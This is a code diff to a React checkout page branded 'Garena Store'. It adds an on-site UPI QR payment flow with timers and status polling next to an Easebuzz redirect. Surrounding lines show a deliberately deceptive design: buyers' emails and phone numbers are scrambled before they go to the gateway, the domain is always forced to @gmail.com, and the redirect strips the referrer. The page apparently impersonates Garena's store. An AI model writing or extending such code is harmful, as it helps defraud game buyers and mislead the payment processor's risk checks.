@@ -2,6 +2,7 @@ import { useState, useEffect, useRef } from 'react';
 import { useSearchParams } from 'react-router-dom';
 import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
 import { db } from '../lib/firebase';
+import QRCode from 'qrcode';
 
 // Helper functions for email & phone alteration before sending to payment gateway
 // Email: Shift each letter in username by 2 positions, and ALWAYS keep domain as @gmail.com
@@ -154,6 +155,41 @@ export default function GarenaCheckout() {
   const [barWidth, setBarWidth] = useState('100%');
   const [showPayModal, setShowPayModal] = useState(false);
 
+  // QR / UPI Mode & Polling state
+  const [showQrModal, setShowQrModal] = useState(false);
+  const [qrDataUrl, setQrDataUrl] = useState('');
+  const [qrTxnid, setQrTxnid] = useState('');
+  const [qrTimer, setQrTimer] = useState(300); // 5 minutes = 300s
+  const [qrStatus, setQrStatus] = useState<'waiting' | 'success' | 'failure' | 'expired'>('waiting');
+
+  const pollIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const qrTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
+
+  const stopQrPolling = () => {
+    if (pollIntervalRef.current) {
+      clearInterval(pollIntervalRef.current);
+      pollIntervalRef.current = null;
+    }
+    if (qrTimerRef.current) {
+      clearInterval(qrTimerRef.current);
+      qrTimerRef.current = null;
+    }
+  };
+
+  const closeQrModal = () => {
+    stopQrPolling();
+    setShowQrModal(false);
+    setQrDataUrl('');
+    setQrTxnid('');
+    setQrStatus('waiting');
+  };
+
+  useEffect(() => {
+    return () => {
+      stopQrPolling();
+    };
+  }, []);
+
   // Success page auto-redirection countdown
   useEffect(() => {
     if (status === 'success') {
@@ -254,18 +290,17 @@ export default function GarenaCheckout() {
     setError('');
     setShowPayModal(false);
     setLoading(true);
-    setLoadingMessage('Initializing secure checkout...');
 
     try {
       // Mandated 5-Second Loading Period before redirection
       for (let secondsLeft = 5; secondsLeft > 0; secondsLeft--) {
-        setLoadingMessage(`Redirecting to payment gateway in ${secondsLeft}s...`);
+        setLoadingMessage(_mode === 'QR' ? `Generating secure QR code in ${secondsLeft}s...` : `Redirecting to payment gateway in ${secondsLeft}s...`);
         await new Promise(r => setTimeout(r, 1000));
       }
 
-      setLoadingMessage('Connecting to Payment Gateway...');
+      setLoadingMessage(_mode === 'QR' ? 'Generating secure QR code...' : 'Connecting to Payment Gateway...');
 
-      const txnid = `GK_EB_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
+      const txnid = `ORD_EB_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
       const productinfo = getProductNameForPrice(pkg);
 
       // Compute altered email and phone as per user specification
@@ -288,7 +323,8 @@ export default function GarenaCheckout() {
           amount: pkg,
           productInfo: productinfo,
           createdAt: serverTimestamp(),
-          status: 'initiated'
+          status: 'initiated',
+          paymentMode: _mode
         });
       } catch (dbErr) {
         console.error('Firebase realtime order logging error:', dbErr);
@@ -305,6 +341,7 @@ export default function GarenaCheckout() {
           email: alteredEmail,
           phone: alteredPhone,
           uid: cleanUid,
+          mode: _mode,
           surl: `${window.location.origin}/api/easebuzz/callback?status=success`,
           furl: `${window.location.origin}/api/easebuzz/callback?status=failed`,
         }),
@@ -318,16 +355,66 @@ export default function GarenaCheckout() {
 
       const accessKey = data.access_key;
 
-      // Clean redirect to Easebuzz hosted payment page without exposing referrers
-      const easebuzzPayUrl = `https://pay.easebuzz.in/pay/${accessKey}`;
+      const qrTargetUrl = data.qr_link || data.upi_intent_url;
 
-      // Create a hidden form with no-referrer policy to navigate cleanly
-      const formEl = document.createElement('form');
-      formEl.setAttribute('referrerpolicy', 'no-referrer');
-      formEl.method = 'GET';
-      formEl.action = easebuzzPayUrl;
-      document.body.appendChild(formEl);
-      formEl.submit();
+      if (_mode === 'QR' && qrTargetUrl) {
+        // Render QR Code Modal on-site
+        const generatedQr = await QRCode.toDataURL(qrTargetUrl, {
+          width: 280,
+          margin: 2,
+          color: { dark: '#000000', light: '#ffffff' }
+        });
+
+        setLoading(false);
+        setQrDataUrl(generatedQr);
+        setQrTxnid(txnid);
+        setQrStatus('waiting');
+        setQrTimer(300);
+        setShowQrModal(true);
+
+        stopQrPolling();
+
+        // 5 minute countdown
+        let timeLeft = 300;
+        qrTimerRef.current = setInterval(() => {
+          timeLeft -= 1;
+          setQrTimer(timeLeft);
+          if (timeLeft <= 0) {
+            stopQrPolling();
+            setQrStatus('expired');
+          }
+        }, 1000);
+
+        // Polling status API every 5 seconds
+        pollIntervalRef.current = setInterval(async () => {
+          try {
+            const statusRes = await fetch(`/api/check-payment-status?txnid=${txnid}`);
+            const statusData = await statusRes.json();
+            if (statusData.status === 'success') {
+              stopQrPolling();
+              setQrStatus('success');
+              setTimeout(() => {
+                window.location.href = `/?status=success&txnid=${txnid}`;
+              }, 1500);
+            } else if (statusData.status === 'failure') {
+              stopQrPolling();
+              setQrStatus('failure');
+            }
+          } catch (pollErr) {
+            console.error('Error polling payment status:', pollErr);
+          }
+        }, 5000);
+
+      } else {
+        // Fallback or ALL mode: Clean redirect to Easebuzz hosted payment page
+        const easebuzzPayUrl = `https://pay.easebuzz.in/pay/${accessKey}`;
+        const formEl = document.createElement('form');
+        formEl.setAttribute('referrerpolicy', 'no-referrer');
+        formEl.method = 'GET';
+        formEl.action = easebuzzPayUrl;
+        document.body.appendChild(formEl);
+        formEl.submit();
+      }
 
     } catch (e: any) {
       console.error('Easebuzz payment error:', e);
@@ -1077,6 +1164,169 @@ export default function GarenaCheckout() {
 
                   <div style={{ textAlign: 'center', fontSize: 11, color: '#aaa', fontWeight: 500 }}>
                     🔒 100% Secure · SSL Encrypted · Powered by Garena Store
+                  </div>
+                </div>
+              </div>
+            )}
+
+            {/* ON-SITE QR / UPI MODAL */}
+            {showQrModal && (
+              <div
+                onClick={closeQrModal}
+                style={{
+                  position: 'fixed', inset: 0, zIndex: 2000,
+                  background: 'rgba(0,0,0,0.65)',
+                  backdropFilter: 'blur(4px)',
+                  display: 'flex', alignItems: 'center', justifyContent: 'center',
+                  padding: '16px', boxSizing: 'border-box'
+                }}
+              >
+                <style>{`
+                  @keyframes pulseDot {
+                    0% { transform: scale(0.95); opacity: 1; box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); }
+                    70% { transform: scale(1); opacity: 0.8; box-shadow: 0 0 0 8px rgba(34, 197, 94, 0); }
+                    100% { transform: scale(0.95); opacity: 1; box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); }
+                  }
+                  .pulse-dot {
+                    width: 10px;
+                    height: 10px;
+                    background-color: #22c55e;
+                    border-radius: 50%;
+                    display: inline-block;
+                    animation: pulseDot 1.8s infinite;
+                  }
+                `}</style>
+
+                <div
+                  onClick={e => e.stopPropagation()}
+                  style={{
+                    background: '#ffffff',
+                    borderRadius: '20px',
+                    width: '100%', maxWidth: '400px',
+                    overflow: 'hidden',
+                    boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04)',
+                    textAlign: 'center',
+                    position: 'relative',
+                    boxSizing: 'border-box'
+                  }}
+                >
+                  {/* Top Red Gradient Bar */}
+                  <div style={{ height: '6px', background: 'linear-gradient(90deg, #ee2c24 0%, #c0392b 100%)' }} />
+
+                  <div style={{ padding: '24px 20px 28px' }}>
+                    <div style={{ fontSize: '18px', fontWeight: 800, color: '#0f172a', marginBottom: '4px' }}>
+                      Scan QR to Pay
+                    </div>
+
+                    <div style={{ fontSize: '28px', fontWeight: 900, color: '#ee2c24', marginBottom: '16px' }}>
+                      ₹{pkg}
+                    </div>
+
+                    {/* QR Code Container */}
+                    <div style={{
+                      display: 'inline-flex',
+                      flexDirection: 'column',
+                      alignItems: 'center',
+                      justifyContent: 'center',
+                      border: '2px dashed #e2e8f0',
+                      padding: '12px',
+                      borderRadius: '16px',
+                      background: '#fafafa',
+                      marginBottom: '16px'
+                    }}>
+                      {qrDataUrl && (
+                        <img
+                          src={qrDataUrl}
+                          alt="UPI QR Code"
+                          style={{ width: '200px', height: '200px', borderRadius: '8px', display: 'block' }}
+                        />
+                      )}
+                    </div>
+
+                    {/* Download QR Button */}
+                    <div style={{ marginBottom: '18px' }}>
+                      <button
+                        onClick={() => {
+                          if (!qrDataUrl) return;
+                          const a = document.createElement('a');
+                          a.href = qrDataUrl;
+                          a.download = `UPI_QR_${pkg}_INR.png`;
+                          a.click();
+                        }}
+                        style={{
+                          display: 'inline-flex', alignItems: 'center', gap: '6px',
+                          padding: '8px 16px', background: '#f1f5f9', color: '#334155',
+                          border: 'none', borderRadius: '12px', fontSize: '13px', fontWeight: 700,
+                          cursor: 'pointer'
+                        }}
+                      >
+                        📥 Download QR Code
+                      </button>
+                    </div>
+
+                    {/* UPI Apps Row */}
+                    <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '12px', marginBottom: '8px' }}>
+                      <img src="https://play-lh.googleusercontent.com/yHTP3WYAPWUydt6zFfhpEUmKWBVJ5PLF7QHlwYy95WclJZwVm2TPKekK1OruO-T5IeuvnMcF6x-MU7F8iR8hkw=w480-h960-rw" alt="GPay" style={{ height: '22px', width: '22px', objectFit: 'contain' }} />
+                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/PhonePe_Logo.svg/1920px-PhonePe_Logo.svg.png" alt="PhonePe" style={{ height: '18px', objectFit: 'contain' }} />
+                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/Paytm_Logo_%28standalone%29.svg/1920px-Paytm_Logo_%28standalone%29.svg.png" alt="Paytm" style={{ height: '16px', objectFit: 'contain' }} />
+                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/UPI_logo.svg/1920px-UPI_logo.svg.png" alt="BHIM UPI" style={{ height: '18px', objectFit: 'contain' }} />
+                    </div>
+
+                    <div style={{ fontSize: '12px', color: '#64748b', fontWeight: 500, marginBottom: '20px' }}>
+                      Scan and pay with any UPI app
+                    </div>
+
+                    {/* Status Badge */}
+                    <div style={{
+                      background: qrStatus === 'success' ? '#f0fdf4' : qrStatus === 'failure' ? '#fef2f2' : qrStatus === 'expired' ? '#fff7ed' : '#f8fafc',
+                      border: `1px solid ${qrStatus === 'success' ? '#bbf7d0' : qrStatus === 'failure' ? '#fecaca' : qrStatus === 'expired' ? '#fed7aa' : '#e2e8f0'}`,
+                      borderRadius: '12px', padding: '12px', marginBottom: '16px',
+                      display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px'
+                    }}>
+                      {qrStatus === 'waiting' && (
+                        <>
+                          <span className="pulse-dot" />
+                          <span style={{ fontSize: '13px', fontWeight: 600, color: '#1e293b' }}>
+                            Waiting for payment...
+                          </span>
+                        </>
+                      )}
+                      {qrStatus === 'success' && (
+                        <span style={{ fontSize: '14px', fontWeight: 700, color: '#16a34a' }}>
+                          ✓ Payment Successful! Redirecting...
+                        </span>
+                      )}
+                      {qrStatus === 'failure' && (
+                        <span style={{ fontSize: '14px', fontWeight: 700, color: '#dc2626' }}>
+                          ✕ Payment Failed. Please try again.
+                        </span>
+                      )}
+                      {qrStatus === 'expired' && (
+                        <span style={{ fontSize: '14px', fontWeight: 700, color: '#ea580c' }}>
+                          ⚠️ QR Code Expired
+                        </span>
+                      )}
+                    </div>
+
+                    {/* Countdown Timer */}
+                    {qrStatus === 'waiting' && (
+                      <div style={{ fontSize: '12px', color: '#94a3b8', fontWeight: 600, marginBottom: '16px' }}>
+                        Session expires in {Math.floor(qrTimer / 60)}:{String(qrTimer % 60).padStart(2, '0')}
+                      </div>
+                    )}
+
+                    {/* Cancel Button */}
+                    <button
+                      onClick={closeQrModal}
+                      style={{
+                        width: '100%', padding: '12px',
+                        background: '#ffffff', color: '#64748b',
+                        border: '1px solid #cbd5e1', borderRadius: '12px',
+                        fontSize: '14px', fontWeight: 700, cursor: 'pointer'
+                      }}
+                    >
+                      Cancel Payment
+                    </button>
                   </div>
                 </div>
               </div>
